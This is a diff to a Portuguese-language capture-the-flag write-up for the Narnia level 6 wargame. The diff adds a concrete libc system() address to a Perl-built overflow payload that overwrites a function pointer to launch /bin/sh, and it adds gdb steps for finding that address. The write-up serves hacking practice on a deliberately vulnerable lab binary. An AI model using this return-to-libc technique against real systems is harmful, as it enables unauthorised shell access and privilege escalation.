@@ -26,15 +26,15 @@ porém, não envie esse payload, antes vamos ter que resgatar algumas coisas...<
 Para conseguir o endereço dessa função é simples, no depurador, sete execute um `b main` para setar um breakpoint na função main<br>
 Inicie o programa, e assim que o breakpoint for atingido digite `p system` para printar o endereço da system<br><br>
 
-<img src="" width="60%"><br><br>
+<img src="https://i.imgur.com/8mdRcoQ.png" width="60%"><br><br>
 
 Agora é a parte fácil...<br>
-Pegue esse endereço, e monte o payload da seguinte forma `$(perl -e 'print "a"x8 . "\x\x\x\x"') $(perl -e 'print "b"x8 . "/bin/sh"')`<br>
+Pegue esse endereço, e monte o payload da seguinte forma `$(perl -e 'print "a"x8 . "\x50\xc8\xe4\xf7"') $(perl -e 'print "b"x8 . "/bin/sh"')`<br>
 Feito isso, basta enviar<br><br>
 
-`./narnia6 $(perl -e 'print "a"x8 . "\x\x\x\x"') $(perl -e 'print "b"x8 . "/bin/sh"')`<br><br>
+`./narnia6 $(perl -e 'print "a"x8 . "\x50\xc8\xe4\xf7"') $(perl -e 'print "b"x8 . "/bin/sh"')`<br><br>
 
-<img src="" width="60%"><br><br>
+<img src="https://i.imgur.com/Q2U3hOd.png" width="60%"><br><br>
 
 [pwn](../README.md)<br>
 [home](../../README.md)
